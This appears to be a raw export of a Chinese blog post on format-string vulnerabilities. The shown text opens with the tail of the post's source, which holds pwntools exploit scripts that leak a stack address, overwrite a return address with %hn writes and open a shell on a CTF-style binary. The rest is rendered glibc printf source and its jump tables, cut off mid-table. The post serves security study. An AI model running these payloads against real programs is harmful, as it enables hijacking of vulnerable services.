'%{}c%6$hn\\x00'.format(rbp_low+8).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n##### 10 修改返回地址\npayload = '%{}c%47$hn'.format(0x1274).encode()\nprint(len(payload))\npayload +=b'/bin/sh\\x00'\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\nio.interactive()\n\n\n```\n\n### 优雅至极\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\ngdb.attach(io,\"b *0x401332\")\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\n\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2 gouzao \npayload =  b\"%p\" * 4 \npayload += '%{}c%hn'.format(rbp_low+0x20-0x4-40).encode()\npayload+= '%{}c%47$hn'.format((0x6873-(rbp_low+0x20)+0xe)).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n# 3 \npayload = b\"%p\" *4 \npayload+= '%{}c%hn'.format(rbp_low+0x12-40).encode()\npayload+= '%{}c%47$hn'.format((0x1274-(rbp_low+0x38)+0x30+0x10000)%0x10000).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\nio.interactive()\n\n```\n","slug":"格式化字符串研究","published":1,"date":"2025-08-12T08:26:55.772Z","updated":"2025-08-24T03:50:51.313Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2hx0005uomye0kf2n6v","content":"<h1 id=\"格式化字符串研究–一次性写的秘密\"><a href=\"#格式化字符串研究–一次性写的秘密\" class=\"headerlink\" title=\"格式化字符串研究–一次性写的秘密\"></a>格式化字符串研究–一次性写的秘密</h1><h2 id=\"相关定义\"><a href=\"#相关定义\" class=\"headerlink\" title=\"相关定义\"></a>相关定义</h2><h3 id=\"printf\"><a href=\"#printf\" class=\"headerlink\" title=\"__printf\"></a>__printf</h3><p>因为printf 函数，会调用__printf函数。我们直接来看该函数<br>它在&#x2F;stdio-common&#x2F;printf.c 中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">__printf (<span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = __vfprintf_internal (<span class=\"built_in\">stdout</span>, format, arg, <span class=\"number\">0</span>);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_printf</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, <span class=\"built_in\">printf</span>);</span><br><span class=\"line\">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，它主要就是调用了__vfprintf_internal函数，继续追踪</p>\n<h3 id=\"vfprintf-internal\"><a href=\"#vfprintf-internal\" class=\"headerlink\" title=\"vfprintf_internal\"></a>vfprintf_internal</h3><p>这个文件在&#x2F;stdio-common&#x2F;vfprintf_internal.c </p>\n<h4 id=\"宏相关定义\"><a href=\"#宏相关定义\" class=\"headerlink\" title=\"宏相关定义\"></a>宏相关定义</h4><p>在148行，有一个宏定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> vfprintf __vfprintf_internal</span></span><br></pre></td></tr></table></figure>\n\n<p>还有一个显然是占位符的一个表，看样子,还是有使用顺序的,对应的顺序里找对应的表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> STEP0_3_TABLE\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 0: at the beginning.  */</span>\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step0_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_space),\t\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_plus),\t\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_minus),\t\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_hash),\t\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_zero),\t\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_quote),\t\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (width_asterics),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (width),\t\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (precision),\t\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_i18n),\t\t<span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 1: after processing width.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step1_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (precision),\t\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 2: after processing precision.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step2_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 3a: after processing first &#x27;h&#x27; modifier.  */</span>\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step3a_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_halfhalf),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span 